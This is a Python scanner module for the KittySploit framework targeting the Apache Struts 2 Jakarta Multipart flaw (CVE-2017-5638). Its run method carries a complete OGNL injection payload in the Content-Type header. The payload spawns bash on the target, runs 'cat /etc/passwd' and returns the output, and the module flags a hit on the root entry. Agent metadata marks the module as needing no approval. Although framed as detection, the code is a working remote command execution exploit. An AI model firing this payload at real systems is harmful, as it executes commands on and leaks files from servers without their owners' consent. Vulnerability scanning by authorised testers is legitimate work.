#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Apache Struts 2."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Apache Struts 2 - Remote Command Execution Detection',
        'description': 'Apache Struts 2.3.x before 2.3.32 and 2.5.x before 2.5.10.1 is susceptible to remote command injection attacks. The Jakarta Multipart parser has incorrect exception handling and error-message generation during file upload attempts, which can allow an attacker to execute arbitrary commands via a crafted Content-Type, Content-Disposition, or Content-Length HTTP header. This was exploited in March 2017 with a Content-Type header containing a #cmd= string.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve2017', 'cve', 'apache', 'kev', 'msf', 'struts', 'rce', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/mazen160/struts-pwn',
            'https://isc.sans.edu/diary/22169',
            'https://github.com/rapid7/metasploit-framework/issues/8064',
            'https://nvd.nist.gov/vuln/detail/CVE-2017-5638',
            'http://blog.talosintelligence.com/2017/03/apache-0-day-exploited.html',
        ],
        'cve': 'CVE-2017-5638',
    }

    def run(self):
        path = '/'
        r = self.http_request(method='GET', path=path, allow_redirects=False, headers={'Content-Type': '%{(#test=\'multipart/form-data\').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#cmd="cat /etc/passwd",#cmds={"/bin/bash","-c",#cmd},#p=new java.lang.ProcessBuilder(#cmds),#p.redirectErrorStream(true),#process=#p.start(),#b=#process.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#rw=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#rw.println(#e),#rw.flush())}'})
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(severity='critical', reason='Apache Struts 2 - Remote Command Execution detected', path=path)
            return True
        return False

